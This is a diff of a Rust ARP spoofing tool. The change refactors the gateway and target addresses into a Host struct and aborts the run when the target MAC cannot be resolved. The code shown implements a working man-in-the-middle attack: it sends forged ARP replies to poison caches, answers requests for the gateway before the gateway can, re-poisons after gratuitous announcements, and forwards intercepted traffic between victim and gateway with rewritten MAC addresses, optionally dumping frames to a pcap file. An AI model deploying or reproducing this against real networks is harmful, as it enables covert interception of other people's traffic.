@@ -15,6 +15,12 @@ use crate::net::{
 /// Delay between packets of the initial burst.
 const BURST_INTERVAL: Duration = Duration::from_millis(20);
 
+#[derive(Clone, Copy)]
+struct Host {
+    ip: Ipv4Addr,
+    mac: MacAddr,
+}
+
 /// Writes a frame to the capture file, logging instead of propagating errors,
 /// so an I/O failure on the dump does not kill the spoofer.
 async fn dump_frame(dump: &mut Option<PcapWriter>, frame: &[u8]) {
@@ -60,48 +66,63 @@ pub(super) async fn run(
         None => None,
     };
 
-    // Attempt to resolve the target MAC
-    if let Some(target_ip) = target_ip {
-        match target_mac {
-            Some(mac) => {
-                table.insert(target_ip, mac);
-            }
-            None => {
-                println!("Resolving target MAC address...");
-                if let Some(target_mac) =
-                    arp::resolve_mac(&tx, &mut rx, our_mac, our_ip, target_ip).await?
-                {
-                    println!("Target MAC address: {target_mac}");
-                    table.insert(target_ip, target_mac);
-                } else {
-                    println!("Failed to resolve target MAC address");
-                }
-            }
-        }
-    }
-
-    // Attempt to resolve the gateway MAC
-    let gateway_mac: MacAddr = match gateway_mac {
-        Some(mac) => mac,
+    // Attempt to resolve the gateway MAC, and make gateway Host
+    let gateway: Host = match gateway_mac {
+        Some(mac) => Host {
+            ip: gateway_ip,
+            mac,
+        },
         None => {
             println!("Resolving gateway MAC address...");
-            if let Some(gateway_mac) =
-                arp::resolve_mac(&tx, &mut rx, our_mac, our_ip, gateway_ip).await?
-            {
-                println!("Gateway MAC address: {gateway_mac}");
-                gateway_mac
-            } else {
-                return Err(io::Error::other("Failed to resolve gateway MAC address"));
+            match arp::resolve_mac(&tx, &mut rx, our_mac, our_ip, gateway_ip).await? {
+                Some(mac) => {
+                    println!("Gateway MAC address: {mac}");
+                    Host {
+                        ip: gateway_ip,
+                        mac,
+                    }
+                }
+                None => {
+                    return Err(io::Error::other("Failed to resolve gateway MAC address"));
+                }
             }
         }
     };
 
+    // Attempt to resolve the target MAC, and make target Host
+    let target: Option<Host> = match target_ip {
+        Some(target_ip) => match target_mac {
+            Some(mac) => {
+                table.insert(target_ip, mac);
+                Some(Host { ip: target_ip, mac })
+            }
+            None => {
+                println!("Resolving target MAC address...");
+                match arp::resolve_mac(&tx, &mut rx, our_mac, our_ip, target_ip).await? {
+                    Some(target_mac) => {
+                        println!("Target MAC address: {target_mac}");
+                        table.insert(target_ip, target_mac);
+                        Some(Host {
+                            ip: target_ip,
+                            mac: target_mac,
+                        })
+                    }
+                    None => {
+                        // The target IP is explicitly set, so if we can't resolve the MAC, the spoofing should not start.
+                        return Err(io::Error::other("Failed to resolve target MAC address"));
+                    }
+                }
+            }
+        },
+        None => None,
+    };
+
     // Without an explicit target, poison every host on the segment using a
     // gratuitous-style frame (sender IP == target IP == gateway)
-    let target_ip: Ipv4Addr = target_ip.unwrap_or(gateway_ip);
+    let target: Host = target.unwrap_or(gateway);
 
     let result: io::Result<()> = tokio::select! {
-        result = spoof_loop(&tx, &mut rx, &mut table, our_mac, gateway_ip, gateway_mac, target_ip, rate, burst, &mut dump) => {
+        result = spoof_loop(&tx, &mut rx, &mut table, our_mac, gateway, target, rate, burst, &mut dump) => {
             result
         }
         result = signal::ctrl_c() => {
@@ -109,16 +130,7 @@ pub(super) async fn run(
         },
     };
 
-    restore_arp(
-        &tx,
-        &table,
-        our_mac,
-        gateway_ip,
-        gateway_mac,
-        burst,
-        &mut dump,
-    )
-    .await?;
+    restore_arp(&tx, &table, our_mac, gateway, burst, &mut dump).await?;
 
     result
 }
@@ -129,9 +141,8 @@ async fn spoof_loop(
     rx: &mut DataLinkReceiver,
     table: &mut HashMap<Ipv4Addr, MacAddr>,
     our_mac: MacAddr,
-    gateway_ip: Ipv4Addr,
-    gateway_mac: MacAddr,
-    target_ip: Ipv4Addr,
+    gateway: Host,
+    target: Host,
     rate: Duration,
     burst: usize,
     dump: &mut Option<PcapWriter>,
@@ -142,9 +153,9 @@ async fn spoof_loop(
         payload: ArpPacket {
             opcode: ArpOpCode::Reply,
             sender_mac: our_mac,
-            sender_ip: gateway_ip,
+            sender_ip: gateway.ip,
             target_mac: MacAddr::BROADCAST,
-            target_ip,
+            target_ip: target.ip,
         },
     };
 
@@ -169,7 +180,7 @@ async fn spoof_loop(
                 dump_frame(dump, &reply).await;
             },
             frame = rx.next() => {
-                if let Err(e) = handle_frame(frame?, table, our_mac, gateway_ip, gateway_mac, tx, &reply, dump).await {
+                if let Err(e) = handle_frame(frame?, table, our_mac, gateway, tx, &reply, dump).await {
                     eprintln!("Error handling frame: {e}");
                 }
             }
@@ -182,17 +193,16 @@ async fn handle_frame(
     frame: Vec<u8>,
     table: &mut HashMap<Ipv4Addr, MacAddr>,
     our_mac: MacAddr,
-    gateway_ip: Ipv4Addr,
-    gateway_mac: MacAddr,
+    gateway: Host,
     tx: &DataLinkSender,
     reply: &[u8],
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
     if let Ok(arp) = ArpFrame::decode(&frame) {
-        return handle_arp(&arp, &frame, table, our_mac, gateway_ip, tx, reply, dump).await;
+        return handle_arp(&arp, &frame, table, our_mac, gateway, tx, reply, dump).await;
     };
 
-    handle_ipv4_packet_forward(frame, table, tx, gateway_mac, our_mac, dump).await
+    handle_ipv4_packet_forward(frame, table, tx, gateway, our_mac, dump).await
 }
 
 #[allow(clippy::too_many_arguments)]
@@ -201,7 +211,7 @@ async fn handle_arp(
     frame: &[u8],
     table: &mut HashMap<Ipv4Addr, MacAddr>,
     our_mac: MacAddr,
-    gateway_ip: Ipv4Addr,
+    gateway: Host,
     tx: &DataLinkSender,
     reply: &[u8],
     dump: &mut Option<PcapWriter>,
@@ -214,7 +224,7 @@ async fn handle_arp(
 
     // The gateway reannounced an IP that we impersonate.
     // Immediately poison again without waiting for the tick
-    if arp.is_gratuitous() && arp.sender_ip == gateway_ip {
+    if arp.is_gratuitous() && arp.sender_ip == gateway.ip {
         println!("Gateway reannounced an IP that we impersonate, spoofing again");
         dump_frame(dump, frame).await;
         tx.send(reply).await?;
@@ -235,7 +245,7 @@ async fn handle_arp(
 
             // Someone is looking for the gateway: answer immediately,
             // so its cache gets poisoned before the gateway can reply
-            if arp.target_ip == gateway_ip {
+            if arp.target_ip == gateway.ip {
                 dump_frame(dump, frame).await;
 
                 let response = DataLinkFrame {
@@ -244,7 +254,7 @@ async fn handle_arp(
                     payload: ArpPacket {
                         opcode: ArpOpCode::Reply,
                         sender_mac: our_mac,
-                        sender_ip: gateway_ip,
+                        sender_ip: gateway.ip,
                         target_mac: arp.eth_src,
                         target_ip: arp.sender_ip,
                     },
@@ -268,7 +278,7 @@ async fn handle_ipv4_packet_forward(
     mut frame: Vec<u8>,
     table: &mut HashMap<Ipv4Addr, MacAddr>,
     tx: &DataLinkSender,
-    gateway_mac: MacAddr,
+    gateway: Host,
     our_mac: MacAddr,
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
@@ -290,14 +300,14 @@ async fn handle_ipv4_packet_forward(
     let src_ip: Ipv4Addr = Ipv4Addr::new(frame[26], frame[27], frame[28], frame[29]);
     let dst_ip: Ipv4Addr = Ipv4Addr::new(frame[30], frame[31], frame[32], frame[33]);
 
-    if dhl.eth_src == gateway_mac {
+    if dhl.eth_src == gateway.mac {
         // gateway to target (look in the ARP table)
         match table.get(&dst_ip) {
             Some(victim_mac) => rewrite_mac_addrs(&mut frame, *victim_mac, our_mac),
             None => return Ok(()), // Target not yet seen (trigger ARP request?)
         }
     } else {
-        rewrite_mac_addrs(&mut frame, gateway_mac, our_mac);
+        rewrite_mac_addrs(&mut frame, gateway.mac, our_mac);
     }
 
     // TODO: allow forwarding the traffic to other tools
@@ -321,19 +331,18 @@ async fn restore_arp(
     tx: &DataLinkSender,
     table: &HashMap<Ipv4Addr, MacAddr>,
     our_mac: MacAddr,
-    gateway_ip: Ipv4Addr,
-    gateway_mac: MacAddr,
+    gateway: Host,
     burst: usize,
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
     // Restore gateway -> target
-    restore_target_arp(tx, table, our_mac, gateway_ip, gateway_mac, burst, dump).await?;
+    restore_target_arp(tx, table, our_mac, gateway, burst, dump).await?;
 
     // Restore target -> gateway
-    restore_gateway_arp(tx, table, our_mac, gateway_ip, gateway_mac, burst, dump).await?;
+    restore_gateway_arp(tx, table, our_mac, gateway, burst, dump).await?;
 
     // Restore all others
-    restore_broadcast_arp(tx, our_mac, gateway_ip, gateway_mac, burst, dump).await?;
+    restore_broadcast_arp(tx, our_mac, gateway, burst, dump).await?;
 
     Ok(())
 }
@@ -342,15 +351,14 @@ async fn restore_target_arp(
     tx: &DataLinkSender,
     table: &HashMap<Ipv4Addr, MacAddr>,
     our_mac: MacAddr,
-    gateway_ip: Ipv4Addr,
-    gateway_mac: MacAddr,
+    gateway: Host,
     burst: usize,
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
     println!("Restoring ARP for gateway -> target...");
 
     for (target_ip, target_mac) in table.iter() {
-        if *target_ip == gateway_ip {
+        if *target_ip == gateway.ip {
             continue;
         }
 
@@ -359,8 +367,8 @@ async fn restore_target_arp(
             eth_src: our_mac,
             payload: ArpPacket {
                 opcode: ArpOpCode::Reply,
-                sender_mac: gateway_mac,
-                sender_ip: gateway_ip,
+                sender_mac: gateway.mac,
+                sender_ip: gateway.ip,
                 target_mac: *target_mac,
                 target_ip: *target_ip,
             },
@@ -374,7 +382,7 @@ async fn restore_target_arp(
             time::sleep(BURST_INTERVAL).await;
         }
 
-        println!("Restored ARP for {gateway_ip} -> {target_ip}.");
+        println!("Restored ARP for {} -> {target_ip}.", gateway.ip);
     }
 
     Ok(())
@@ -384,8 +392,7 @@ async fn restore_gateway_arp(
     tx: &DataLinkSender,
     table: &HashMap<Ipv4Addr, MacAddr>,
     our_mac: MacAddr,
-    gateway_ip: Ipv4Addr,
-    gateway_mac: MacAddr,
+    gateway: Host,
     burst: usize,
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
@@ -393,19 +400,19 @@ async fn restore_gateway_arp(
 
     for (target_ip, target_mac) in table.iter() {
         // Skip the gateway itself
-        if *target_ip == gateway_ip {
+        if *target_ip == gateway.ip {
             continue;
         }
 
         let reply = DataLinkFrame {
-            eth_dst: gateway_mac,
+            eth_dst: gateway.mac,
             eth_src: our_mac,
             payload: ArpPacket {
                 opcode: ArpOpCode::Reply,
                 sender_mac: *target_mac,
                 sender_ip: *target_ip,
-                target_mac: gateway_mac,
-                target_ip: gateway_ip,
+                target_mac: gateway.mac,
+                target_ip: gateway.ip,
             },
         };
 
@@ -417,7 +424,7 @@ async fn restore_gateway_arp(
             time::sleep(BURST_INTERVAL).await;
         }
 
-        println!("Restored ARP for {target_ip} -> {gateway_ip}.");
+        println!("Restored ARP for {target_ip} -> {}.", gateway.ip);
     }
 
     Ok(())
@@ -426,8 +433,7 @@ async fn restore_gateway_arp(
 async fn restore_broadcast_arp(
     tx: &DataLinkSender,
     our_mac: MacAddr,
-    gateway_ip: Ipv4Addr,
-    gateway_mac: MacAddr,
+    gateway: Host,
     burst: usize,
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
@@ -438,10 +444,10 @@ async fn restore_broadcast_arp(
         eth_src: our_mac,
         payload: ArpPacket {
             opcode: ArpOpCode::Reply,
-            sender_mac: gateway_mac,
-            sender_ip: gateway_ip,
-            target_mac: gateway_mac,
-            target_ip: gateway_ip,
+            sender_mac: gateway.mac,
+            sender_ip: gateway.ip,
+            target_mac: gateway.mac,
+            target_ip: gateway.ip,
         },
     };
 
